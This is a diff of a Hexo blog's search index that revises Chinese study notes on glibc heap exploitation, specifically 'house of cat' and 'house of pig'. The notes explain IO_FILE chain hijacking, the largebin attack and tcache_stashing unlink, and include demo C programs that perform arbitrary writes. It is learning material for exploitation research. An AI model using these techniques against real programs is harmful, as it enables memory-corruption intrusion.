@@ -1,15 +1,9 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>house-of-pig</title>
-    <url>/2024/07/11/house-of-pig-1/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title></title>
+    <title>house-of-cat</title>
     <url>/2024/08/14/house%20of%20cat/</url>
-    <content><![CDATA[<p>title: house of cat</p>
-<h1 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本:"></a>适用版本:</h1><h3 id="2-23-2-25"><a href="#2-23-2-25" class="headerlink" title="2.23-2.25"></a>2.23-2.25</h3><h1 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h1><p>–能<strong>任意写</strong>一个<strong>可控</strong>地址（如largebin attack）</p>
+    <content><![CDATA[<h1 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本:"></a>适用版本:</h1><h3 id="2-23-2-25"><a href="#2-23-2-25" class="headerlink" title="2.23-2.25"></a>2.23-2.25</h3><h1 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h1><p>–能<strong>任意写</strong>一个<strong>可控</strong>地址（如largebin attack）</p>
 <p>–能泄露 libc 地址和 heap 地址</p>
 <p>–能触发 <strong>IO 流</strong>（三种方式）</p>
 <p>​		1.调用exit或从main退出</p>
@@ -46,14 +40,14 @@
 <li>old_top.prev_inuse = 0;</li>
 <li>old_top页对齐</li>
 </ol>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240602214501966.png" alt="image-20240602214501966"></p>
+<p><img src="/pic/house_of_cat/1.png" alt="img"></p>
 <h2 id="fxprintf-vfxprintf"><a href="#fxprintf-vfxprintf" class="headerlink" title="fxprintf -> vfxprintf"></a>fxprintf -&gt; vfxprintf</h2><p>这里可以没有遇到困难可以直接到</p>
 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">int __vfxprintf (FILE *fp, const char *fmt, va_list ap,</span><br><span class="line">         unsigned int mode_flags)</span><br><span class="line">{</span><br><span class="line">  if (fp == NULL)</span><br><span class="line">    fp = stderr;</span><br><span class="line">  _IO_flockfile (fp);</span><br><span class="line">  int res = locked_vfxprintf (fp, fmt, ap, mode_flags);</span><br><span class="line">  _IO_funlockfile (fp);</span><br><span class="line">  return res;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
 
 <h3 id="第一个阻碍点"><a href="#第一个阻碍点" class="headerlink" title="第一个阻碍点"></a>第一个阻碍点</h3><p>接着往下面走</p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240602234004388.png" alt="image-20240602234004388"></p>
+<p><img src="/pic/house_of_cat/2.png" alt="img"></p>
 <p>在这里卡住了我们看一下源码</p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240602234034295.png" alt="image-20240602234034295"></p>
+<p><img src="/pic/house_of_cat/3.png" alt="img"></p>
 <p>_IO_flockfile的源码</p>
 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"># define _IO_flockfile(_fp) \</span><br><span class="line">  if (((_fp)-&gt;_flags &amp; _IO_USER_LOCK) == 0) _IO_lock_lock (*(_fp)-&gt;_lock)</span><br></pre></td></tr></tbody></table></figure>
 
@@ -62,58 +56,42 @@
 
 <p> 可以看到进了之后就是一个无限循环，死锁。所以我们要绕过这个，通过上面的代码可以得到条件</p>
 <p>1.fp–&gt;flag要是一个可读取的地址</p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240602235212324.png" alt="image-20240602235212324"></p>
+<p><img src="/pic/house_of_cat/4.png" alt="img"></p>
 <p>然后就可以绕过这个检测</p>
 <h2 id="locked-vfxprintf-vfprintf-internal直接可以进"><a href="#locked-vfxprintf-vfprintf-internal直接可以进" class="headerlink" title="locked_vfxprintf -> vfprintf_internal直接可以进"></a>locked_vfxprintf -&gt; vfprintf_internal直接可以进</h2><h3 id="第二个障碍点"><a href="#第二个障碍点" class="headerlink" title="第二个障碍点"></a>第二个障碍点</h3><p>然后接着往下面走发现进不了vtable，通过源码调试发现</p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240603003642792.png" alt="image-20240603003642792"></p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240603003726012.png" alt="image-20240603003726012"></p>
+<p><img src="/pic/house_of_cat/5.png" alt="img"></p>
+<p><img src="/pic/house_of_cat/6.png" alt="img"></p>
 <p>不能进入_IO_vtable_check 进入就代表没过检测，这里检测vtable的位置于是出现了第二个障碍点</p>
 <p>1.通过修改fake_io的结构来给虚表的位置赋值为_IO_file_xsputn+0x10</p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240603004505289.png" alt="image-20240603004505289"></p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240603005957946.png" alt="image-20240603005957946"></p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240603005926685.png" alt="image-20240603005926685"></p>
-<h2 id="第二条链也是house-of-cat的关键"><a href="#第二条链也是house-of-cat的关键" class="headerlink" title="第二条链也是house of cat的关键"></a>第二条链也是house of cat的关键</h2><h3 id="第三个障碍"><a href="#第三个障碍" class="headerlink" title="第三个障碍"></a>第三个障碍</h3><p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240603011158903.png" alt="image-20240603011158903"></p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240603102508163.png" alt="image-20240603102508163"></p>
+<p><img src="/pic/house_of_cat/7.png" alt="img"></p>
+<p><img src="/pic/house_of_cat/8.png" alt="img"></p>
+<p><img src="/pic/house_of_cat/9.png" alt="img"></p>
+<h2 id="第二条链也是house-of-cat的关键"><a href="#第二条链也是house-of-cat的关键" class="headerlink" title="第二条链也是house of cat的关键"></a>第二条链也是house of cat的关键</h2><h3 id="第三个障碍"><a href="#第三个障碍" class="headerlink" title="第三个障碍"></a>第三个障碍</h3><p><img src="/pic/house_of_cat/10.png" alt="img"></p>
+<p><img src="/pic/house_of_cat/11.png" alt="img"></p>
 <p>1.这个地方需要fp–&gt;wide_data要有值</p>
 <p>2.这个值指向的两个位置一个是IO_write_ptr一个是IO_write_base,前者要比后者小才对**，不然就无法使was_writting为true</p>
 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">bool was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">              &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">             || _IO_in_put_mode (fp));</span><br></pre></td></tr></tbody></table></figure>
 
 <p>然后就进入_IO_switch_to_wget_mode</p>
-<h2 id="劫持rip流"><a href="#劫持rip流" class="headerlink" title="劫持rip流"></a>劫持rip流</h2><p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240603110504949.png" alt="image-20240603110504949"></p>
+<h2 id="劫持rip流"><a href="#劫持rip流" class="headerlink" title="劫持rip流"></a>劫持rip流</h2><p><img src="/pic/house_of_cat/12.png" alt="img"></p>
 <p>通过rax–&gt;[rax+0xe0]–&gt; 到call  [rax+0xe0]+0x18 来劫持rip</p>
 <p>还可以劫持rdx</p>
 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">0x7ffff7e07cbf &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]     RDX, [0x5555555592b0] =&gt; 2</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240603110835858.png" alt="image-20240603110835858"></p>
+<p><img src="/pic/house_of_cat/13.png" alt="img"></p>
 <p>成功劫持，至此house of cat的过程结束</p>
 ]]></content>
+      <categories>
+        <category>pwn学习</category>
+        <category>堆利用</category>
+      </categories>
+      <tags>
+        <tag>house_of</tag>
+      </tags>
   </entry>
   <entry>
     <title>house-of-pig</title>
-    <url>/2024/07/11/house-of-pig-2/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2024/07/09/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></tbody></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></tbody></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></tbody></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>house-of-pig</title>
-    <url>/2024/07/11/house-of-pig/</url>
+    <url>/2024/08/15/house-of-pig/</url>
     <content><![CDATA[<p>使用版本</p>
 <p>攻击原理</p>
 <p>前置知识学习：2.31版本后的large bin attack的利用，tcache_stashing unlink的原理，高版本下IO的攻击思路</p>
@@ -141,9 +119,9 @@
                 }
 </code></pre>
 <p>转变为这条路径:</p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240701144337251.png" alt="image-20240701144337251"></p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240701144406787.png" alt="image-20240701144406787"></p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240701144457102.png" alt="image-20240701144457102"></p>
+<p><img src="/pic/house_of_pig/1.png" alt="img"></p>
+<p><img src="/pic/house_of_pig/2.png" alt="img"></p>
+<p><img src="/pic/house_of_pig/3.png" alt="img"></p>
 <p>已知:</p>
 <p>largebin1=p1,largebin2=p2（大的那个）</p>
 <p>fwd-&gt;fd=p2,bck=p2,p2-&gt;bk_nextsize=target-0x20</p>
@@ -156,7 +134,7 @@
 <p>==&gt;target-0x20  -&gt;fd_nextsize=victim</p>
 <p>==&gt;target=victim</p>
 <p>也就是导致下图的这两个效果</p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240701150048097.png" alt="image-20240701150048097"></p>
+<p><img src="/pic/house_of_pig/4.png" alt="img"></p>
 <p>测试demo：</p>
 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;assert.h&gt;</span><br><span class="line">int main(){</span><br><span class="line">  size_t target = 0;</span><br><span class="line">  size_t *p1 = malloc(0x428);</span><br><span class="line">  size_t *g1 = malloc(0x18);</span><br><span class="line">  size_t *p2 = malloc(0x418);</span><br><span class="line">  size_t *g2 = malloc(0x18);</span><br><span class="line">  free(p1);</span><br><span class="line">  size_t *g3 = malloc(0x438);</span><br><span class="line">  free(p2);</span><br><span class="line">  p1[3] = (size_t)((&amp;target)-4);</span><br><span class="line">  size_t *g4 = malloc(0x438);</span><br><span class="line">  assert((size_t)(p2-2) == target);</span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
 
@@ -179,14 +157,14 @@
 <h4 id="demo调试"><a href="#demo调试" class="headerlink" title="demo调试"></a>demo调试</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;inttypes.h&gt;</span><br><span class="line">static uint64_t victim[4] = {0, 0, 0, 0};</span><br><span class="line">int main(int argc, char **argv){</span><br><span class="line">    setbuf(stdout, 0);</span><br><span class="line">    setbuf(stderr, 0);</span><br><span class="line">    char *t1;</span><br><span class="line">    char *s1, *s2, *pad;</span><br><span class="line">    char *tmp;</span><br><span class="line">    tmp = malloc(0x1);</span><br><span class="line">    victim[1] = (uint64_t)(&amp;victim);</span><br><span class="line">    for(int i=0; i&lt;5; i++){</span><br><span class="line">        t1 = calloc(1, 0x50);</span><br><span class="line">        free(t1);</span><br><span class="line">    }</span><br><span class="line">    s1 = malloc(0x420);</span><br><span class="line">    pad = malloc(0x20);</span><br><span class="line">    free(s1);</span><br><span class="line">    malloc(0x3c0);</span><br><span class="line">    malloc(0x100);</span><br><span class="line">    s2 = malloc(0x420);</span><br><span class="line">    pad = malloc(0x80);</span><br><span class="line">    free(s2);</span><br><span class="line">    malloc(0x3c0);</span><br><span class="line">    malloc(0x100);</span><br><span class="line">    *(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&amp;victim)-0x10;</span><br><span class="line">    calloc(1, 0x50);</span><br><span class="line">    uint64_t *r = (uint64_t*)malloc(0x50);</span><br><span class="line">    r[0] = 0xaa;</span><br><span class="line">    r[1] = 0xbb;</span><br><span class="line">    r[2] = 0xcc;</span><br><span class="line">    r[3] = 0xdd;</span><br><span class="line">    return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
 
 <p>整个程序流程：通过calloc和malloc加切割unsorted bin结合 来构造五个tcache和两个small bin 并且修改第二个small bin的bk为target -0x10的情况</p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240705004035766.png" alt="image-20240705004035766"></p>
+<p><img src="/pic/house_of_pig/5.png" alt="img"></p>
 <p>修改smallbin的bk为target-0x10</p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240705004111423.png" alt="image-20240705004111423"></p>
+<p><img src="/pic/house_of_pig/6.png" alt="img"></p>
 <p>然后calloc申请绕过tcache 得到堆块 然后进入stash</p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240705005246794.png" alt="image-20240705005246794"></p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240705005323767.png" alt="image-20240705005323767"></p>
+<p><img src="/pic/house_of_pig/7.png" alt="img"></p>
+<p><img src="/pic/house_of_pig/8.png" alt="img"></p>
 <p>然后再通过malloc取出 实现任意写的功能：</p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240705010728136.png" alt="image-20240705010728136"></p>
+<p><img src="/pic/house_of_pig/9.png" alt="img"></p>
 <h3 id="tcache-stashing-unlink-1"><a href="#tcache-stashing-unlink-1" class="headerlink" title="tcache_stashing unlink++"></a>tcache_stashing <em>unlink++</em></h3><p>将一个任意地址当做堆块放入到 tcache 中，同时可以往一个任意地址写入一个 libc 地址。</p>
 <ul>
 <li>选定一个 n = size，释放五个大小为 n 的堆块进入到 tcache bin；</li>
@@ -200,102 +178,16 @@
 <p>这个整体攻击思路都没啥变化，就是再任意写的基础上 加了一个可利用的点，把target2的位置设为libc就是main_arena+？的值</p>
 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;inttypes.h&gt;</span><br><span class="line"></span><br><span class="line">static uint64_t victim[4] = {0, 0, 0, 0};</span><br><span class="line">static uint64_t victim2 = 0;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) {</span><br><span class="line">    setbuf(stdout, 0);</span><br><span class="line">    setbuf(stderr, 0);</span><br><span class="line"></span><br><span class="line">    char *t1;</span><br><span class="line">    char *s1, *s2, *pad;</span><br><span class="line">    char *tmp;</span><br><span class="line"></span><br><span class="line">    tmp = malloc(0x1);</span><br><span class="line">    victim[1] = (uint64_t)(&amp;victim2)-0x10;</span><br><span class="line"></span><br><span class="line">    for (int i=0; i&lt;5; i++) {</span><br><span class="line">        t1 = calloc(1, 0x50);</span><br><span class="line">        free(t1);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    s1 = malloc(0x420);</span><br><span class="line">    pad = malloc(0x20);</span><br><span class="line">    free(s1);</span><br><span class="line">    malloc(0x3c0);</span><br><span class="line">    malloc(0x100);</span><br><span class="line"></span><br><span class="line">    s2 = malloc(0x420);</span><br><span class="line">    pad = malloc(0x80);</span><br><span class="line">    free(s2);</span><br><span class="line">    malloc(0x3c0);</span><br><span class="line">    malloc(0x100);</span><br><span class="line">    *(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&amp;victim)-0x10;</span><br><span class="line"></span><br><span class="line">    calloc(1, 0x50);</span><br><span class="line"></span><br><span class="line">    uint64_t *r = (uint64_t*)malloc(0x50);</span><br><span class="line">    r[0] = 0xaa;</span><br><span class="line">    r[1] = 0xbb;</span><br><span class="line">    r[2] = 0xcc;</span><br><span class="line">    r[3] = 0xdd;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240705011714523.png" alt="image-20240705011714523"></p>
+<p><img src="/pic/house_of_pig/10.png" alt="img"></p>
 <p>漏洞利用后</p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240705011738384.png" alt="image-20240705011738384"></p>
-<p>既可以任意写，也可以把这个target2覆盖为libc</p>
-<p>IO_FILE 利用使用版本</p>
-<p>攻击原理</p>
-<p>前置知识学习：2.31版本后的large bin attack的利用，tcache_stashing unlink的原理，高版本下IO的攻击思路</p>
-<h2 id="2-31下large-bin-attack利用-1"><a href="#2-31下large-bin-attack利用-1" class="headerlink" title="2.31下large bin attack利用"></a><em><strong>2.31下large bin attack利用</strong></em></h2><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件:"></a>利用条件:</h3><p>1.libc版本:2.31-2.35</p>
-<p>2.漏洞利用条件：</p>
-<p>1.可以分配两个不同大小的chunk 一个到unsorted bin 一个到largebin  且从unsorted bin 进入large bin的chunk的size要小于原large bin的size</p>
-<p>2.可以通过uaf 或者 溢出漏洞去修改，chunk的bk_nextsize为target_addr-0x20</p>
-<h3 id="实现效果：-1"><a href="#实现效果：-1" class="headerlink" title="实现效果："></a>实现效果：</h3><p>往目标值中写入一个chunk的地址值</p>
-<h3 id="漏洞原理：-1"><a href="#漏洞原理：-1" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><p>贴一下glibc2.31的源码</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (in_smallbin_range (size))</span><br><span class="line">            {</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            }</span><br><span class="line">          else</span><br><span class="line">            {</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              /* maintain large bins in sorted order */</span><br><span class="line">              if (fwd != bck)</span><br><span class="line">                {</span><br><span class="line">                  /* Or with inuse bit to speed comparisons */</span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  /* if smaller than smallest, bypass loop below */</span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  if ((unsigned long) (size)</span><br><span class="line">		      &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    {</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    }</span><br><span class="line">                  else</span><br><span class="line">                    {</span><br><span class="line">                      assert (chunk_main_arena (fwd));</span><br><span class="line">                      while ((unsigned long) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                        {</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">			  assert (chunk_main_arena (fwd));</span><br><span class="line">                        }</span><br><span class="line"></span><br><span class="line">                      if ((unsigned long) size</span><br><span class="line">			  == (unsigned long) chunksize_nomask (fwd))</span><br><span class="line">                        /* Always insert in the second position.  */</span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      else</span><br><span class="line">                        {</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                            malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        }</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                      if (bck-&gt;fd != fwd)</span><br><span class="line">                        malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">              else</span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br></pre></td></tr></tbody></table></figure>
-
-<p>我们可以看到在2.30版本后新增了两个check</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#check 1：</span><br><span class="line">if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n");</span><br><span class="line">  malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)\n");</span><br><span class="line">#check 2:</span><br><span class="line">if (bck-&gt;fd != fwd)</span><br><span class="line">malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");</span><br><span class="line">  printf("This prevents the traditional large bin attack\n");</span><br></pre></td></tr></tbody></table></figure>
-
-<p>所以相比较起来 我们的攻击思路也就是核心代码也改变了，相当于换了一条攻击路径：</p>
-<pre><code>              if ((unsigned long) (size)
-          &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))
-                {
-                  fwd = bck;
-                  bck = bck-&gt;bk;
-
-                  victim-&gt;fd_nextsize = fwd-&gt;fd;
-                  victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;
-                  fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
-                }
-</code></pre>
-<p>转变为这条路径:</p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240701144337251.png" alt="image-20240701144337251"></p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240701144406787.png" alt="image-20240701144406787"></p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240701144457102.png" alt="image-20240701144457102"></p>
-<p>已知:</p>
-<p>largebin1=p1,largebin2=p2（大的那个）</p>
-<p>fwd-&gt;fd=p2,bck=p2,p2-&gt;bk_nextsize=target-0x20</p>
-<p>由</p>
-<p>fwd-&gt;fd-&gt;bk_nextsize=victim-&gt;bk_nextsize-&gt;fd_nextsize=victim</p>
-<p>==&gt;victim-&gt;bk_nextsize-&gt;fd_nextsize=victim</p>
-<p>且：  victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</p>
-<p>==&gt;fwd-&gt;fd-&gt;bk_nextsize-&gt;fd_nextsize=victim</p>
-<p>==&gt;p2-&gt;bk_nextsize-&gt;fd_nextsize=victim</p>
-<p>==&gt;target-0x20  -&gt;fd_nextsize=victim</p>
-<p>==&gt;target=victim</p>
-<p>也就是导致下图的这两个效果</p>
-<p><img src="C:\Users\muxuecen\AppData\Roaming\Typora\typora-user-images\image-20240701150048097.png" alt="image-20240701150048097"></p>
-<p>测试demo：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;assert.h&gt;</span><br><span class="line">int main(){</span><br><span class="line">  size_t target = 0;</span><br><span class="line">  size_t *p1 = malloc(0x428);</span><br><span class="line">  size_t *g1 = malloc(0x18);</span><br><span class="line">  size_t *p2 = malloc(0x418);</span><br><span class="line">  size_t *g2 = malloc(0x18);</span><br><span class="line">  free(p1);</span><br><span class="line">  size_t *g3 = malloc(0x438);</span><br><span class="line">  free(p2);</span><br><span class="line">  p1[3] = (size_t)((&amp;target)-4);</span><br><span class="line">  size_t *g4 = malloc(0x438);</span><br><span class="line">  assert((size_t)(p2-2) == target);</span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-
-<h2 id="tcache-stashing-unlink部分-1"><a href="#tcache-stashing-unlink部分-1" class="headerlink" title="tcache_stashing unlink部分"></a><em>tcache_stashing</em> unlink部分</h2><h3 id="tcache-stashing-unlink-2"><a href="#tcache-stashing-unlink-2" class="headerlink" title="tcache_stashing unlink+"></a><em>tcache_stashing</em> unlink+</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (in_smallbin_range (nb))</span><br><span class="line">    {</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      if ((victim = last (bin)) != bin)</span><br><span class="line">      //victim就是要脱链的堆块，也就是small bin里的最后一个</span><br><span class="line">      //这个if在判断我们所需要的size的那条small bin链上是否存在堆块，存在的话就把victim给脱链</span><br><span class="line">        {</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">      if (__glibc_unlikely (bck-&gt;fd != victim))//对small bin的双向链表的完整性做了检查，确保victim-&gt;bk-&gt;fd指向的还是victim</span><br><span class="line">    //如果我们在这里劫持了victim的bk指针，就会导致bck的fd指向的并不是victim，从而触发异常</span><br><span class="line">        malloc_printerr ("malloc(): smallbin double linked list corrupted");</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);//设置下一个（高地址）chunk的prev_inuse位</span><br><span class="line">          bin-&gt;bk = bck;//将victim脱链</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line">          if (av != &amp;main_arena)</span><br><span class="line">        set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">      /* While we're here, if we see other chunks of the same size,</span><br><span class="line">         stash them in the tcache.  */</span><br><span class="line">      size_t tc_idx = csize2tidx (nb);//获取size对应的tcache索引</span><br><span class="line">      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)//如果这个索引在tcache bin的范围里，也就是这个size属于tcache bin的范围</span><br><span class="line">        {</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">          /* While bin not empty and tcache not full, copy chunks over.  */</span><br><span class="line">          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count//如果tcache bin没有满</span><br><span class="line">            &amp;&amp; (tc_victim = last (bin)) != bin)//如果small bin不为空,tc_victim为small bin中的最后一个堆块</span><br><span class="line">       {</span><br><span class="line">         if (tc_victim != 0)</span><br><span class="line">           {</span><br><span class="line">             bck = tc_victim-&gt;bk;//这里取tc_victim的bk指针，并没有针对bck做双向链表完整性检查，因此我们可以去攻击tc_victim的bk指针</span><br><span class="line">             set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">             if (av != &amp;main_arena)</span><br><span class="line">          set_non_main_arena (tc_victim);</span><br><span class="line">             bin-&gt;bk = bck;//将tc_victim从small bin中脱链</span><br><span class="line">             bck-&gt;fd = bin;//如果我们伪造bck，这里就可以将bck-&gt;fd的位置写入一个bin的地址(main_arena+96)</span><br><span class="line">             tcache_put (tc_victim, tc_idx);//将tc_victim链入tc_idx这条链</span><br><span class="line">                }</span><br><span class="line">       }</span><br><span class="line">        }</span><br><span class="line">#endif</span><br><span class="line">          void *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          return p;</span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
-
